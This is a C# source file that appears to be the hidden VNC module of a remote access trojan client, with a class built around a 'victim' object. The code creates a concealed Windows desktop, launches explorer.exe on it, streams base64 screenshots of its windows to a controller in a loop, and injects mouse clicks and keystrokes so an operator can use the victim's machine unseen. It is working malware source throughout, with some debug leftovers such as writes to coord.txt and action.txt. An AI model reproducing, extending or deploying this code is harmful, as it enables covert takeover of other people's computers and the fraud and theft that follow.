using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.IO;
using System.Threading;

namespace winClient48
{
    public class clsfnHvncSession : IDisposable
    {
        private clsVictim m_victim;

        private IntPtr m_hDesktop;
        public string m_szDesktopName;
        private IntPtr m_hLastWnd;

        private bool m_disposed = false;
        public bool m_bRunning = false;

        private const uint GENERIC_ALL = 0x10000000;
        private const int UOI_NAME = 2;
        private const uint STARTF_USESHOWWINDOW = 0x00000001;
        private const int SW_MAXIMIZE = 3;
        private const uint PW_RENDERFULLCONTENT = 0x00000002;

        private Size m_Resolution = new Size(0, 0);

        public clsfnHvncSession(clsVictim victim, string szDesktopName)
        {
            m_victim = victim;
            m_szDesktopName = szDesktopName;
            m_hDesktop = WinAPI.CreateDesktop(szDesktopName, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
            m_Resolution = fnGetResolution();

            if (m_hDesktop == IntPtr.Zero)
                throw new Exception("Create window failed.");
        }

        /// <summary>
        /// Get resolution of the current monitor.
        /// </summary>
        /// <returns></returns>
        private Size fnGetResolution()
        {
            int nWidth = WinAPI.GetSystemMetrics(0);
            int nHeight = WinAPI.GetSystemMetrics(1);

            return new Size(nWidth, nHeight);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="hWndParent"></param>
        /// <param name="x"></param>
        /// <param name="y"></param>
        /// <returns></returns>
        private IntPtr GetDeepestChild(IntPtr hWndParent, int x, int y)
        {
            Point pt = new Point(x, y);
            WinAPI.ScreenToClient(hWndParent, ref pt);

            IntPtr hWndChild = WinAPI.ChildWindowFromPointEx(hWndParent, pt, 0x0000); // CWP_ALL

            if (hWndChild != IntPtr.Zero && hWndChild != hWndParent)
            {
                IntPtr hRecursiveChild = GetDeepestChild(hWndChild, x, y);
                return hRecursiveChild != IntPtr.Zero ? hRecursiveChild : hWndChild;
            }

            return hWndParent;
        }

        /// <summary>
        /// Create process.
        /// </summary>
        /// <param name="szExe"></param>
        public void fnCreate(string szExe = "explorer.exe /separate")
        {
            WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = m_szDesktopName;
            si.dwFlags = 0x00000001;
            si.wShowWindow = SW_MAXIMIZE;

            WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();

            //"explorer.exe /separate"
            StringBuilder sb = new StringBuilder(szExe);

            bool success = WinAPI.CreateProcess(
                null,
                sb,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (success)
            {
                WinAPI.CloseHandle(pi.hProcess);
                WinAPI.CloseHandle(pi.hThread);
            }
        }

        /// <summary>
        /// Start HVNC
        /// </summary>
        /// <param name="nDelay"></param>
        public void fnStart(int nDelay)
        {
            while (m_bRunning)
            {
                Bitmap bmp = fnGetScreenshot();
                string b64 = clsGlobal.BitmapToBase64(bmp);

                m_victim.fnSendCommand(new string[]
                {
                    "hvnc",
                    "window",
                    "sc",
                    m_szDesktopName,
                    "1",
                    b64,
                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
                });

                Thread.Sleep(nDelay);
            }
        }

        /// <summary>
        /// Do screenshot via HVNC.
        /// </summary>
        /// <returns></returns>
        public Bitmap fnGetScreenshot()
        {
            WinAPI.SetThreadDesktop(m_hDesktop);

            Size size = m_Resolution;
            int nWidth = size.Width;
            int nHeight = size.Height;

            Bitmap bmp = new Bitmap(nWidth, nHeight, PixelFormat.Format32bppPArgb);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.Clear(Color.FromArgb(45, 45, 45));
                IntPtr hdc = g.GetHdc();

                List<IntPtr> windowList = new List<IntPtr>();

                WinAPI.EnumDesktopWindows(m_hDesktop, (hWnd, lParam) =>
                {
                    if (WinAPI.IsWindowVisible(hWnd))
                    {
                        windowList.Add(hWnd);
                    }
                    return true;
                }, IntPtr.Zero);

                windowList.Reverse();

                foreach (IntPtr hWnd in windowList)
                {
                    WinAPI.PrintWindow(hWnd, hdc, PW_RENDERFULLCONTENT);
                }

                g.ReleaseHdc(hdc);
            }
            return bmp;
        }

        /// <summary>
        /// Input and process mouse movement.
        /// </summary>
        /// <param name="type"></param>
        /// <param name="x"></param>
        /// <param name="y"></param>
        public void fnHandleMouseInput(string type, int x, int y)
        {
            File.WriteAllText("coord.txt", $"{type},{x},{y}");

            WinAPI.SetThreadDesktop(m_hDesktop);

            Point p = new Point(x, y);

            IntPtr hWnd = WinAPI.WindowFromPoint(x, y);
            IntPtr hChild = WinAPI.ChildWindowFromPoint(hWnd, p);
            if (IntPtr.Zero != hChild && hChild != hWnd)
                hWnd = hChild;

            m_hLastWnd = hWnd;

            if (IntPtr.Zero == hWnd)
            {
                //File.WriteAllText("nothing.txt", "nothing");
                return;
            }

            StringBuilder sb = new StringBuilder(256);
            WinAPI.GetClassName(hWnd, sb, 256);
            File.WriteAllText("something.txt", sb.ToString() + "|" + type);

            WinAPI.ScreenToClient(hWnd, ref p);
            IntPtr lParam = (IntPtr)((p.Y << 16) | (p.X & 0xFFFF));

            switch (type.ToUpper())
            {
                case "MOVE":
                    WinAPI.PostMessage(hWnd, 0x0200, IntPtr.Zero, lParam);
                    break;
                case "LD":
                    WinAPI.SetForegroundWindow(hWnd);
                    WinAPI.PostMessage(hWnd, 0x0006, (IntPtr)1, IntPtr.Zero); // WM_ACTIVATE
                    WinAPI.SetFocus(hWnd);
                    WinAPI.PostMessage(hWnd, 0x0201, (IntPtr)1, lParam);
                    break;
                case "LU":
                    WinAPI.PostMessage(hWnd, 0x0202, IntPtr.Zero, lParam);
                    break;
                case "RD":
                    WinAPI.PostMessage(hWnd, 0x0204, (IntPtr)2, lParam);
                    break;
                case "RU":
                    WinAPI.PostMessage(hWnd, 0x0205, IntPtr.Zero, lParam);
                    break;
            }

            if (type != "MOVE")
            {
                File.WriteAllText("action.txt", $"{type},{x},{y}");
            }
        }

        /// <summary>
        /// Input and process keyboard char.
        /// </summary>
        /// <param name="action"></param>
        /// <param name="vk"></param>
        public void fnHandleKeyboardInput(string action, int vk)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);

            IntPtr hWnd = (m_hLastWnd != IntPtr.Zero) ? m_hLastWnd : WinAPI.GetForegroundWindow();

            if (IntPtr.Zero == hWnd)
            {
                MessageBox.Show("X");
                return;
            }

            uint scanCode = WinAPI.MapVirtualKey((uint)vk, 0);
            uint lParam;

            if (action.ToLower() == "down")
            {
                lParam = 0x00000001 | (scanCode << 16);
                WinAPI.PostMessage(hWnd, 0x0100, (IntPtr)vk, (IntPtr)lParam);
            }
            else
            {
                lParam = 0xC0000001 | (scanCode << 16);
                WinAPI.PostMessage(hWnd, 0x0101, (IntPtr)vk, (IntPtr)lParam);
            }
        }

        private bool fnIsTextKey(int vk) => (vk >= 65 && vk <= 90) || (vk >= 48 && vk <= 57) || vk == 32 || vk == 13;

        public void Dispose()
        {
            if (!m_disposed)
            {
                if (m_hDesktop != IntPtr.Zero)
                    WinAPI.CloseDesktop(m_hDesktop);
                m_disposed = true;
            }
        }
    }
}